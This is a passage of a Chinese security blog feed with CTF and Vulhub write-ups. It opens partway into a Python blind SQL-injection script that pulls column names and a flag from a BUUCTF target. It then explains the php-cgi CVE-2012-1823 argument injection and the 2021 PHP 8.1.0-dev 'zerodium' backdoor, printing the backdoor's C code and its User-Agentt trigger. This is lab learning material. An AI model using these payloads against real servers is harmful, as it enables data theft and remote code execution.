<span class="number">127</span></span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">            payload = <span class="string">&#x27;if((asCii(Substr((selEct groUp_Concat(column_nAme) frOm infOrMation_schEma.columns whEre tabLe_name = \&#x27;here_is_flag\&#x27;),&#123;&#125;,1)))&gt;&#123;&#125;,1,0)--+&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            str5 = url + payload</span><br><span class="line">            <span class="comment"># print(str5)</span></span><br><span class="line">            res = requests.get(url=str5)</span><br><span class="line">            <span class="keyword">if</span> check(res):</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        columnname += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(columnname)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkflag</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">80</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">            payload = <span class="string">&#x27;if((asCii(Substr((selEct flag from here_is_flag),&#123;&#125;,1)))&gt;&#123;&#125;,1,0)--+&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            str6 = url + payload</span><br><span class="line">            <span class="comment"># print(str6)</span></span><br><span class="line">            res = requests.get(url=str6)</span><br><span class="line">            <span class="keyword">if</span> check(res):</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># checklength()</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># checkdataname()</span></span><br><span class="line"><span class="comment"># ctf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># checktable()</span></span><br><span class="line"><span class="comment"># grades,here_is_flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># checkcolumn()</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># checkflag()</span></span><br><span class="line"><span class="comment"># flag&#123;845ef206-8555-440b-a654-6cfa251cf139&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;:::warning no-icon&lt;/p&gt;
&lt;p&gt;做题记录如下&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://luffys93.github.io/buuctf/buu/&quot;&gt;buu1&lt;/a&gt; -&amp;gt; &lt;a href=&quot;https://luffys93.github.io/buuctf/buu2/&quot;&gt;buu2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;:::&lt;/p&gt;
&lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;DASCTF-X-0psu3十一月挑战赛｜越艰巨·越狂热-single-php&quot;&gt;&lt;a href=&quot;#DASCTF-X-0psu3十一月挑战赛｜越艰巨·越狂热-single-php&quot; class=&quot;headerlink&quot; title=&quot;[DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]single_php&quot;&gt;&lt;/a&gt;[DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]single_php&lt;/h2&gt;&lt;p&gt;根据提示，可以传&lt;code&gt;LuckyE&lt;/code&gt;变量，它的值可以试试&lt;code&gt;show_source&lt;/code&gt;&lt;/p&gt;
&lt;img src=&quot;/2024/03/20/buuctf/buu/image-20240320152718124.png&quot; class=&quot;&quot; title=&quot;image-20240320152718124&quot;&gt;

&lt;p&gt;看似是反序列化，但咱无法getshell，因为就算能够成功也只是执行函数&lt;/p&gt;
&lt;p&gt;根据提示，进入siranai.php&lt;/p&gt;
&lt;p&gt;发现是一个文件上传&lt;/p&gt;
    
    </summary>
    
    
      <category term="buu平台" scheme="http://luffys93.github.io/categories/buu%E5%B9%B3%E5%8F%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2012-1823复现</title>
    <link href="http://luffys93.github.io/2024/03/19/vulhub/CVE-2012-1823/"/>
    <id>http://luffys93.github.io/2024/03/19/vulhub/CVE-2012-1823/</id>
    <published>2024-03-19T10:43:42.000Z</published>
    <updated>2024-07-31T08:38:45.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h1><p>简单复现</p><img src="/2024/03/19/vulhub/CVE-2012-1823/image-20240319184647559.png" class="" title="image-20240319184647559"><p>根据提示，可以进入index.php看看有没有什么信息</p><span id="more"></span><p>并没有存在什么信息，根据提示，当输入<code>/index.php?-s</code>时会暴露后端源码</p><img src="/2024/03/19/vulhub/CVE-2012-1823/image-20240319185125049.png" class="" title="image-20240319185125049"><p>漏洞全貌大概就这样</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>先引入一个概念和它引申的分支</p><h3 id="什么是CGI-confused"><a href="#什么是CGI-confused" class="headerlink" title="什么是CGI(:confused:)"></a>什么是CGI(:confused:)</h3><p>Common Gateway Interface，即通用网关接口，它是一个Web服务器主机提供信息服务的标准接口，Web服务器通过这个接口来获取客户端提交的信息，然后转交给服务端的CGI程序处理，最后再返回给客户端。</p><h3 id="PHP-CGI"><a href="#PHP-CGI" class="headerlink" title="PHP-CGI"></a>PHP-CGI</h3><p>它是一个用于处理PHP脚本的可执行文件。该文件使用CGI来与WEB服务器通信，在接收HTTP请求的同时处理PHP脚本，然后再将结果返回给WEB服务器</p><h3 id="SAPI是什么"><a href="#SAPI是什么" class="headerlink" title="SAPI是什么"></a>SAPI是什么</h3><p>Server Application Programming Interface，服务器应用编程接口，实际上它定义了一个统一的接口，提供了外部应用与PHP通信交互的管道，Apache的mod_php和常见的fpm（用于管理FastCGI后端的进程）都是SAPI，这里我们要说的php-cgi也是一种SAPI</p><h3 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h3><h4 id="直接成因"><a href="#直接成因" class="headerlink" title="直接成因"></a>直接成因</h4><p>用户请求的querystring被作为了php-cgi的参数，并导致了一些结果</p><p>:::info</p><p>querystring，即查询字符串，它是url的一部分，用于传递其他参数和数据，<code>www.example.com/?key=value</code>中，querystring为<code>?</code>后面的一部分</p><p>:::</p><h4 id="深究一下"><a href="#深究一下" class="headerlink" title="深究一下"></a>深究一下</h4><p>看了看其他大佬的文章，发现CGI有如下参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SERVER_SOFTWARE：运行服务器的名称和版本。</span><br><span class="line">SERVER_NAME：服务器的主机名、域名或IP地址。</span><br><span class="line">GATEWAY_INTERFACE：CGI规范的版本。</span><br><span class="line">SERVER_PROTOCOL：请求使用的协议名称和版本，例如HTTP/1.1。</span><br><span class="line">SERVER_PORT：服务器接收请求的端口号。</span><br><span class="line">REQUEST_METHOD：请求使用的方法，例如GET、POST。</span><br><span class="line">PATH_INFO：脚本后的额外路径信息，用于传递给脚本。</span><br><span class="line">PATH_TRANSLATED：根据PATH_INFO转换后的实际路径。</span><br><span class="line">SCRIPT_NAME：脚本的虚拟路径。</span><br><span class="line">QUERY_STRING：URL中问号（?）后面的查询字符串。</span><br><span class="line">REMOTE_HOST：发出请求的客户端主机名。</span><br><span class="line">REMOTE_ADDR：发出请求的客户端IP地址。</span><br><span class="line">REMOTE_USER：服务器进行认证后，认定的用户名称。</span><br><span class="line">REMOTE_IDENT：用户的HTTP身份信息，如果HTTP服务器支持RFC 1413。</span><br><span class="line">CONTENT_TYPE：对于POST请求，数据的内容类型。</span><br><span class="line">CONTENT_LENGTH：对于POST请求，数据的长度。</span><br><span class="line">HTTP_ACCEPT：客户端接受的MIME类型。</span><br><span class="line">HTTP_USER_AGENT：发出请求的客户端浏览器的标识字符串。</span><br><span class="line">HTTP_COOKIE：客户端发送的Cookie。</span><br></pre></td></tr></table></figure><p>根据RFC3875对Command Line的描述：</p><p><code>Some systems support a method for supplying an array of strings to the CGI script.This is only used in the case of an &#39;indexed&#39; HTTP query, which is identified by a &#39;GET&#39; or &#39;HEAD&#39; request with a URI query string that does not contain any unencoded &quot;=&quot; characters. For such a request, the server SHOULD treat the query-string as a search-string and parse it into words, using the rules</code></p><p>大致意思是querystring中如果不包含未编码的<code>=</code>。就会把querystring作为cgi的参数传入</p><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p>CGI模式下有几个参数可以用：</p><ul><li><code>-c</code> 指定php.ini文件的位置</li><li><code>-n</code> 不要加载php.ini文件</li><li><code>-d</code> 指定配置项</li><li><code>-b</code> 启动fastcgi进程</li><li><code>-s</code> 显示文件源码</li><li><code>-T</code> 执行指定次该文件</li><li><code>-h</code>和<code>-?</code> 显示帮助</li></ul><p>由于我们是在CGI模式下复现的，因此可以直接传递参数，效果已经在前面展示过了</p><p>还有一种用法就是通过<code>-d</code>来实现getshell，例如把文件包含功能打开，用文件包含漏洞</p><img src="/2024/03/19/vulhub/CVE-2012-1823/image-20240320143141872.png" class="" title="image-20240320143141872"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实际上还是远程命令执行漏洞，攻破命令这一关之后用什么啥方法都行:laughing:</p><h2 id="其他可以了解的"><a href="#其他可以了解的" class="headerlink" title="其他可以了解的"></a>其他可以了解的</h2><h3 id="CGI的工作原理"><a href="#CGI的工作原理" class="headerlink" title="CGI的工作原理"></a>CGI的工作原理</h3><img src="/2024/03/19/vulhub/CVE-2012-1823/image-20240320122116024.png" class="" title="image-20240320122116024"><ol><li>根据net发送请求给服务器，服务器接收请求；</li><li>服务器将请求发送给CGI程序处理；</li><li>CGI程序将处理好的结果发送给服务器；</li><li>服务器接收结果后将其发送给用户。</li></ol><h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>它是在原有的CGI上优化出来的产物。由于进程的创建和调度都需要一定的消耗，进程数量有限，因此基于CGI模式运行的网站一般不能接收大量请求，否则每个进程创造出来的子进程可能会导致服务器被挤爆或者瘫痪。FastCGI相较于原来的CGI，它更像是一种常驻型程序，减少了在进程创建和销毁方面的消耗，提高了处理Web请求的效率。</p><p>这个漏洞只出现在CGI运行模式中（如果我没记错的话:confounded:）</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CVE-2012-1823&quot;&gt;&lt;a href=&quot;#CVE-2012-1823&quot; class=&quot;headerlink&quot; title=&quot;CVE-2012-1823&quot;&gt;&lt;/a&gt;CVE-2012-1823&lt;/h1&gt;&lt;p&gt;简单复现&lt;/p&gt;
&lt;img src=&quot;/2024/03/19/vulhub/CVE-2012-1823/image-20240319184647559.png&quot; class=&quot;&quot; title=&quot;image-20240319184647559&quot;&gt;

&lt;p&gt;根据提示，可以进入index.php看看有没有什么信息&lt;/p&gt;
    
    </summary>
    
    
      <category term="Vulhub" scheme="http://luffys93.github.io/categories/Vulhub/"/>
    
    
  </entry>
  
  <entry>
    <title>81backdoor</title>
    <link href="http://luffys93.github.io/2024/03/19/vulhub/81backdoor/"/>
    <id>http://luffys93.github.io/2024/03/19/vulhub/81backdoor/</id>
    <published>2024-03-19T05:47:15.000Z</published>
    <updated>2024-07-31T08:38:39.507Z</updated>
    
    <content type="html"><![CDATA[<h1 id="8-1-0-php后门"><a href="#8-1-0-php后门" class="headerlink" title="8.1.0 php后门"></a>8.1.0 php后门</h1><h2 id="一个简单的复现"><a href="#一个简单的复现" class="headerlink" title="一个简单的复现"></a>一个简单的复现</h2><p>利用docker搭建起来后只有一句话</p><img src="/2024/03/19/vulhub/81backdoor/image-20240319134841231.png" class="" title="image-20240319134841231"><span id="more"></span><p>抓个包看看有没有什么东西</p><img src="/2024/03/19/vulhub/81backdoor/image-20240319135202904.png" class="" title="image-20240319135202904"><p>丢到repeater后发包也没看到有什么</p><p>根据提示，可以在请求头部加<code>User-Agentt: zerodiumvar_dump(2*3);</code></p><img src="/2024/03/19/vulhub/81backdoor/image-20240319135830712.png" class="" title="image-20240319135830712"><p>可以远程命令执行</p><img src="/2024/03/19/vulhub/81backdoor/image-20240319140149516.png" class="" title="image-20240319140149516"><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>2021年PHP Git仓库遭到入侵，攻击者在PHP源码中植入了恶意代码，这种恶意代码是被攻击者伪装成开发者或维护者的身份来进行提交，实际效果是植入了一个远程RCE后门。它会通过检查HTTP头中的字符串，如果是以zerodium开头，则会触发后门，执行php代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">zval zoh;</span><br><span class="line">php_output_handler *h;</span><br><span class="line">zval *enc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL(<span class="string">&quot;_SERVER&quot;</span>))) &amp;&amp; (enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), <span class="string">&quot;HTTP_USER_AGENTT&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;HTTP_USER_AGENTT&quot;</span>) - <span class="number">1</span>))) &#123;</span><br><span class="line">convert_to_string(enc);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(Z_STRVAL_P(enc), <span class="string">&quot;zerodium&quot;</span>)) &#123;</span><br><span class="line">zend_try &#123;</span><br><span class="line">zend_eval_string(Z_STRVAL_P(enc)+<span class="number">8</span>, <span class="literal">NULL</span>, <span class="string">&quot;REMOVETHIS: sold to zerodium, mid 2017&quot;</span>);</span><br><span class="line">&#125; zend_end_try();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里攻击者用了一个让人混淆的<code>HTTP_USER_AGENTT</code>头，<code>zend_try</code>和<code>zend_end_try</code>用于异常处理，即使执行的代码有问题也不会造成php的崩溃</p><p>在<code>strstr(Z_STRVAL_P(enc), &quot;zerodium&quot;)</code>中，<code>strstr()</code>函数用于查找第一个字符串中是否有包含第二个字符串，如果有，就返回后者在前者第一次出现的位置的指针，没有就返回<code>NULL</code>；</p><p><code>Z_STRVAL_P(enc)</code>了解一下就行，它是PHP扩展开发中的一个宏，用于从zval结构体变量中提取字符串</p><p>:::info</p><p>zval结构体构成比较复杂，感兴趣的可以<a href="https://learnku.com/docs/php-internals/php7/zvals_basic_structure/6851">点击这里</a></p><p>:::</p><p><code>zend_eval_string()</code>相当于<code>eval()</code>，第二个变量用于接受执行结果，NULL则表示不关心执行结果</p><p>[:heavy_check_mark:get一点]{.label .success}看似代码长，实际上仔细分析之后也就那样，函数执行什么功能一般就会以什么功能的单词命名，还算好理解的</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;8-1-0-php后门&quot;&gt;&lt;a href=&quot;#8-1-0-php后门&quot; class=&quot;headerlink&quot; title=&quot;8.1.0 php后门&quot;&gt;&lt;/a&gt;8.1.0 php后门&lt;/h1&gt;&lt;h2 id=&quot;一个简单的复现&quot;&gt;&lt;a href=&quot;#一个简单的复现&quot; class=&quot;headerlink&quot; title=&quot;一个简单的复现&quot;&gt;&lt;/a&gt;一个简单的复现&lt;/h2&gt;&lt;p&gt;利用docker搭建起来后只有一句话&lt;/p&gt;
&lt;img src=&quot;/2024/03/19/vulhub/81backdoor/image-20240319134841231.png&quot; class=&quot;&quot; title=&quot;image-20240319134841231&quot;&gt;
    
    </summary>
    
    
      <category term="Vulhub" scheme="http://luffys93.github.io/categories/Vulhub/"/>
    
    
  </entry>
  
</feed>
